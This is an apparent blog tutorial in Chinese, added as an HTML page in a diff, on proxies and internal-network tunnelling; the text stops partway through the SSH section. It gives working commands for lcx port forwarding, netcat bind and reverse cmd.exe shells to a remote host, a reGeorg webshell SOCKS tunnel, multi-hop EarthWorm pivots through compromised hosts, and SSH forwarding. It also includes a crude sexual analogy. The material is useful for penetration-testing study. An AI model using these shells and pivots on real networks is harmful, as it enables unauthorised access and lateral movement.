@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>0x01 正向和反向代理｜网络工程 / 代理与隧道｜BEN.OPS</title>
+  <meta name="description" content="0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…">
+  <meta name="keywords" content="网络工程，代理与隧道，Linux，Windows，DNS，PHP，权限管理，知识笔记，网络工程 / 代理与隧道，0x01 正向和反向代理">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%2B%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%2BLinux%2BWindows-0x01%20%E6%AD%A3%E5%90%91%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="0x01 正向和反向代理">
+  <meta property="og:description" content="0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="网络工程 / 代理与隧道">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/93fca80e6b9cf15185.jpg">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="0x01 正向和反向代理">
+  <meta name="twitter:description" content="0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/93fca80e6b9cf15185.jpg">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html#article","headline":"0x01 正向和反向代理","description":"0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["网络工程","代理与隧道"],"keywords":["网络工程","代理与隧道","Linux","Windows","DNS","PHP","权限管理","知识笔记","网络工程 / 代理与隧道","0x01 正向和反向代理"],"wordCount":3323,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/93fca80e6b9cf15185.jpg"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"网络工程 / 代理与隧道","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"0x01 正向和反向代理","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>网络工程 / 代理与隧道</span> › <span>0x01 正向和反向代理</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">网络工程 / 代理与隧道</div>
+      <h1>0x01 正向和反向代理</h1>
+      <p class="lede">0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">3,323 字</span>
+        <span class="badge">10 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<p>原文 by <a href="http://ch.vksec.com/2017/06/blog-post_72.html" rel="noopener noreferrer">CH_vksec</a></p>
+<p>最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/93fca80e6b9cf15185.jpg"/></p>
+<h2 id="0x01-正向和反向代理">0x01 正向和反向代理</h2>
+<p>正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p>
+<h3 id="正向代理-Forward-Proxy">正向代理 (Forward Proxy)</h3>
+<p>Lhost－－》proxy－－》Rhost
+Lhost 为了访问到 Rhost，向 proxy 发送了一个请求并且指定目标是 Rhost，然后 proxy 向 Rhost 转交请求并将获得的内容返回给 Lhost，简单来说正向代理就是 proxy 代替了我们去访问 Rhost。</p>
+<h3 id="反向代理-reverse-proxy">反向代理（reverse proxy）</h3>
+<p>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost
+和正向代理相反（废话），Lhost 只向 proxy 发送普通的请求，具体让他转到哪里，proxy 自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许 proxy 数据进出的时候可以有效的进行穿透</p>
+<h3 id="简单区分">简单区分</h3>
+<p>正向代理代理的是客户端，反向代理代理的是服务端，正向代理是我们自己 (Lhost) 戴套 (proxy) 插进去，反向代理是她 (Rhost) 主动通过上位 (proxy) 坐上来(Lhost)。</p>
+<h2 id="0x02-lcx-转发">0x02 lcx 转发</h2>
+<p>内网 IP：203.0.113.1
+公网 ip：203.0.113.1
+由于是本地实验，我这里将 138 的防火墙打开，当作内网环境，140 防火墙关闭，充当公网 ip，所以正常情况下不只能 138 访问 140，而 140 不能直接访问 138。这是两台机器互相 ping 的结果。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/ad53f1912c25fe14b0.png"/></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/f00a2a38943b85213e.png"/></p>
+<ol>
+<li>
+<p>内网机器上执行：lcx.exe –slave 公网 IP + 端口 内网 IP + 端口
+<code>lcx.exe –slave 203.0.113.1 4444 203.0.113.1 3389</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/9391bf54ff24955ef2.png"/>
+将内网 (203.0.113.1) 的 3389 端口转发到公网 (203.0.113.1) 的 4444 端口</p>
+</li>
+<li>
+<p>公网 (203.0.113.1) 执行：<code>lcx -listen 4444 5555</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/58df87eca9043eecdd.png"/>
+监听公网 4444 端口请求，并将 4444 的请求传送给 5555 端口。
+此时已经把内网的 3389 端口转发到了公网的 5555 端口。可以通过 203.0.113.1:5555 连接到内网的远程桌面。
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/a85b7f43358059fea9.png"/></p>
+</li>
+</ol>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/b0e8bc841bb283e6c4.png"/></p>
+<h2 id="0x03-nc-反弹">0x03 nc 反弹</h2>
+<h3 id="正向连接">正向连接</h3>
+<p>在内网执行</p>
+<p><code>nc -l -p 5555 -t -e cmd.exe</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/73ff05cf911ae3c526.png"/></p>
+<p>-t是通过 telne 模式执行 cmd.exe 程序，可以省略。
+在公网执行</p>
+<p><code>nc -nvv 203.0.113.1 5555</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/ee834c5dd6e9fa9eac.png"/></p>
+<h3 id="反向连接">反向连接</h3>
+<p>在公网监听nc -lp 5555</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/3dc2cd49add144446d.png"/></p>
+<p>在内网机器反弹nc -t -e cmd 203.0.113.1 5555
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/7bebbc2afc4770595a.png"/></p>
+<h2 id="0x04-socks-代理工具">0x04 socks 代理工具</h2>
+<p>常见的 socks 代理工具介绍如下
+1. Earthworm 工具网址：http://rootkiter.com/EarthWorm
+EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 "正向"、"反向"、"多级级联" 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内, 强烈推荐使用。
+目前已经有了最新版 Termite，工具网址：http://rootkiter.com/Termite/</p>
+<ol start="2">
+<li>
+<p>reGeorg 工具网址：https://github.com/NoneNotNull/reGeorg
+reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个 socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。</p>
+</li>
+<li>
+<p>sSocks 工具网址：http://sourceforge.net/projects/ssocks/
+sSocks 是一个 socks 代理工具套装，可用来开启 socks 代理服务，支持 socks5 验证，支持 IPV6 和 UDP，并提供反向 socks 代理服务，即将远程计算机作为 socks 代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为 0.0.13。</p>
+</li>
+<li>
+<p>SocksCap64 工具网址：http://www.sockscap64.com (需翻墙)
+SocksCap64 是一款在 windows 下相当好使的全局代理软件。SocksCap64 可以使 Windows 应用程序通过 SOCKS 代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持 SOCKS 代理的应用程序通过 SocksCap64 之后都可以完美的实现代理访问。</p>
+</li>
+<li>
+<p>proxychains 工具网址：http://proxychains.sourceforge.net/
+Proxychains 是一款在 LINUX 下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上网，允許 TCP 和 DNS 通過代理隧道，支持 HTTP、SOCKS4、SOCKS5 類型的代理服务器，支持 proxy chain，即可配置多个代理，同一個 proxy chain 可使用不同类型的代理服务器</p>
+</li>
+</ol>
+<h3 id="0x04-1-reGeorg-Proxychains-代理">0x04.1 reGeorg+Proxychains 代理</h3>
+<p>上传 reGeorg 的 tunnel.jsp 到服务器。访问链接，并转发到本地端口。</p>
+<p><code>python reGeorgSocksProxy.py -p 1080 -u http://203.0.113.1/tunnel.jsp</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/5208166536e4b80197.png"/></p>
+<p>使用设置 proxychains 的代理端口，进行访问，一般配合 nmap 和 metasploit 进行后续内网渗透。ps：proxychains 不支持 udp 和 icmp 协议，所以使用 nmap 要加上-sT -Pn即使用 tcp 协议且不使用 icmp 协议。
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/c892923d685a377d79.png"/></p>
+<h3 id="0x04-2-ew-穿透">0x04.2 ew 穿透</h3>
+<p>该工具借用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/5b786c57781dc8f846.png"/></p>
+<p>说明</p>
+<p>目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:
+<code>ssocksd   rcsocks   rssocks        lcx_slave lcx_tran  lcx_listen</code>
+其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。
+其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。
+lcx 类别管道：
+lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
+lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
+lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
+通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
+下面是一个三级跳的本地测试例子。</p>
+<pre><code>./ew -s rcsocks -l 1080 -e 8888
+./ew -s lcx_slave -d 203.0.113.1 -e 8888 -f 203.0.113.1 -g 9999
+./ew -s lcx_listen -l 9999 -e 7777
+./ew -s rssocks -d 203.0.113.1 -e 7777
+</code></pre>
+<p>数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
+<h4 id="0x0421-socks5">0x04.2.1 正向 SOCKS5 服务器</h4>
+<p>当目标网络边界存在公网 IP 且可任意开监听端口</p>
+<p><code>ew_for_Win.exe -s ssocksd -l 8888</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/2248b8488d872f3a17.png"/></p>
+<p>上述命令是在该机器（203.0.113.1）开启一个 8888 的正向连接端口。然后其它主机可通过设置代理为 203.0.113.1:8888 添加这个代理。这里使用的是 proxychains</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/9fcdb2b2c80a53fe03.png"/></p>
+<h4 id="0x0422-socks5">0x04.2.2 反弹 SOCKS5 服务器</h4>
+<p>当目标网络边界不存在公网 IP，通过反弹方式创建 socks 代理。
+先在一台具有公网 ip 的主机 A 上运行以下命令</p>
+<p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/11224eb94e7781a144.png"/></p>
+<p>意思是在我们公网 VPS 上添加一个转接隧道，把 1080 端口收到的代理请求转交给 8888 端口</p>
+<p>在目标主机 B 上启动 SOCKS5 服务 并反弹到公网主机的 8888 端口</p>
+<p><code>ew_for_Win.exe -s rssocks -d 203.0.113.1 -e 8888</code></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/c5dbeeeff611d657cc.png"/></p>
+<p>本地主机（203.0.113.1）然后通过添加公网 203.0.113.1:1080 这个代理, 来访问内网机器（203.0.113.1）
+当然如果本地主机如果是公网 ip，就可以把在公网执行的步骤放在本地执行即可。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/972001105960e30ece.png"/></p>
+<h4 id="0x0423">0x04.2.3 二级网络环境（一）</h4>
+<p>假设我们获得了右侧 A 主机和 B 主机的控制权限，A 主机配有 2 块网卡，一块 203.0.113.1 连通外网，一块 203.0.113.1 只能连接内网 B 主机，无法访问内网其它资源。B 主机可以访问内网资源，但无法访问外网。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/7380d5742701595dc2.png"/></p>
+<p>先上传 ew 到 B 主机，利用 ssocksd 方式启动 8888 端口的 SOCKS 代理，命令如下</p>
+<p><code>ew_for_Win.exe -s ssocksd -l 8888</code>
+然后在 A 主机执行</p>
+<p><code>ew_for_Win.exe -s lcx_tran -l 1080 -f 203.0.113.1 -g 8888</code></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/d0888be7e200f70814.png"/></p>
+<p>含义是将 1080 端口收到的代理请求转交给 B 主机（203.0.113.1）的 8888 端口
+然后 My pc 就可以通过 A 的外网代理 203.0.113.1:1080 访问 B。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/a23d6664fcbe0d3f09.png"/></p>
+<h4 id="0x0424">0x04.2.4 二级网络环境（二）</h4>
+<p>假设我们获得了右侧 A 主机和 B 主机的控制权限，A 主机没有公网 IP，也无法访问内网资源。B 主机可以访问内网资源，但无法访问外网。</p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/80bdc17f5ac72df692.png"/></p>
+<p>这次操作有四步。</p>
+<ol>
+<li>
+<p>在公网 vps（45.xxx.xxx.72）添加转接隧道，将 10800 端口收到的代理请求转交给 8888 端口
+<code>./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/2528b99c45376272d5.png"/></p>
+</li>
+<li>
+<p>B（203.0.113.1）主机正向开启 8888 端口
+<code>ew_for_Win.exe -s ssocksd -l 9999</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/cd247babd2932fc814.png"/></p>
+</li>
+<li>
+<p>A 主机利用 lcx_slave 方式，将公网 VPS 的 888 端口和 B 主机的 999 端口连接起来
+<code>ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 203.0.113.1 -g 9999</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/ab36b571ad11f80a21.png"/></p>
+</li>
+<li>
+<p>现在 my pc 可通过访问 45.xxx.xxx.72:10800 来使用 203.0.113.1 主机提供的 socks5 代理，代理成功，vps 会有 rssocks cmd_socket OK! 提示</p>
+</li>
+</ol>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/a26b58dfecf834d8d8.png"/></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/e92d82cbabb97cfc79.png"/></p>
+<h2 id="0x05-ssh-隧道代理转发">0x05 ssh 隧道代理转发</h2>
+<p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p>
+<p>本地访问127.0.0.1:port1就是host:port2(用的更多)
+<code>ssh -CfNg -L port1:203.0.113.1:port2 user@host</code>   #本地转发
+访问host:port2就是访问127.0.0.1:port1
+<code>ssh -CfNg -R port2:203.0.113.1:port1 user@host</code>    #远程转发
+可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
+<code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip</code>   #正向隧道
+监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口
+<code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip</code>   #反向隧道
+用于内网穿透防火墙限制之类
+socket 代理: <code>ssh -qTfnN -D port remotehost</code></p>
+<p>参数详解：
+-q Quiet mode. 安静模式
+-T Disable pseudo-tty allocation. 不占用 shell 了
+-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数 -N Do not execute a remote command. 不执行远程命令，端口转发就用它了
+<code>-L port:host:hostport</code>  将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口.
+IPv6 地址用另一种格式说明: <code>port/host/hostport -R port:host:hostport</code>  将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口.
+IPv6 地址用另一种格式说明: port/host/hostport -D port  指定一个本地机器 "动态的'' 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</p>
+<h3 id="0x05-1-ssh-本地转发">0x05.1 ssh 本地转发</h3>
+<p>远程管理服务器上的 mysql，mysql 不能直接 root 远程登陆。这时候就可以通过本地转发，通过 ssh 将服务器的 3306 端口转发到本地 1234 端口</p>
+<p><code>ssh -CfNg -L 1234 203.0.113.1:3306 root@203.0.113.1</code>
